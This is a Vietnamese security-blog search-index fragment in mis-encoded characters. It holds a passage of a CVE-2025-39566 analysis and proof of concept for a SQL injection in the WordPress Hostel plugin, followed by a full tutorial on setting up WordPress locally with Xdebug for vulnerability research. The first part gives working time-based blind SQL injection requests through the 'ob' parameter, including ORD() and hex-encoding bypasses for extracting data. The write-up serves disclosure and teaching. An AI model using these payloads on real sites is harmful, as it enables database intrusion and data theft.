bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"}]